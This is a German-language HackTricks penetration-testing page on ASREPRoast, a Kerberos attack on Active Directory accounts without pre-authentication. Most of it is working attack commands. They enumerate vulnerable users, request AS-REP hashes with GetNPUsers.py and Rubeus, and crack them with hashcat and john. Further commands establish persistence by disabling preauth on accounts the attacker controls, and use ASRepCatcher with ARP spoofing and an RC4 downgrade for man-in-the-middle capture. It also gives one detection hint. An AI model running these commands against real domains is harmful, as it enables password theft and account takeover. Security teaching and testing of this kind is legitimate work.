# ASREPRoast

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Einblicke**\
Engagieren Sie sich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen

**Echtzeit-Hack-Nachrichten**\
Bleiben Sie auf dem Laufenden über die schnelllebige Hackerwelt durch Echtzeitnachrichten und Einblicke

**Neueste Ankündigungen**\
Bleiben Sie informiert über die neuesten Bug-Bounties und wichtige Plattform-Updates

**Treten Sie uns auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit den besten Hackern zusammenzuarbeiten!

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, die das **Kerberos-Vorab-Authentifizierungsattribut** nicht haben. Im Wesentlichen ermöglicht diese Schwachstelle Angreifern, die Authentifizierung für einen Benutzer vom Domain Controller (DC) anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist, den Angreifer offline zu knacken versuchen können, um das Passwort des Benutzers zu entdecken.

Die Hauptanforderungen für diesen Angriff sind:

* **Fehlende Kerberos-Vorab-Authentifizierung**: Zielbenutzer dürfen diese Sicherheitsfunktion nicht aktiviert haben.
* **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
* **Optionales Domänenkonto**: Ein Domänenkonto ermöglicht es Angreifern, anfällige Benutzer effizienter durch LDAP-Abfragen zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.

#### Auflisten anfälliger Benutzer (benötigt Domänenanmeldeinformationen)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Verwendung von Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### AS\_REP-Nachricht anfordern

{% code title="Verwendung von Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows verwenden" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting mit Rubeus wird eine 4768 mit einem Verschlüsselungstyp von 0x17 und einem Preauth-Typ von 0 generieren.
{% endhint %}

### Knacken
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenz

Zwinge **preauth** nicht für einen Benutzer, bei dem du **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) hast:

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Verwendung von Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast ohne Anmeldeinformationen

Ein Angreifer kann eine Man-in-the-Middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchqueren, ohne sich darauf zu verlassen, dass die Kerberos-Vorab-Authentifizierung deaktiviert ist. Es funktioniert daher für alle Benutzer im VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht uns dies. Darüber hinaus zwingt das Tool Client-Workstations, RC4 zu verwenden, indem es die Kerberos-Verhandlung ändert.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Einblicke**\
Engagiere dich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen

**Echtzeit Hack Nachrichten**\
Bleibe auf dem Laufenden mit der schnelllebigen Hack-Welt durch Echtzeit-Nachrichten und Einblicke

**Neueste Ankündigungen**\
Bleibe informiert über die neuesten Bug-Bounties und wichtige Plattform-Updates

**Tritt uns bei auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginne noch heute mit den besten Hackern zusammenzuarbeiten!

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
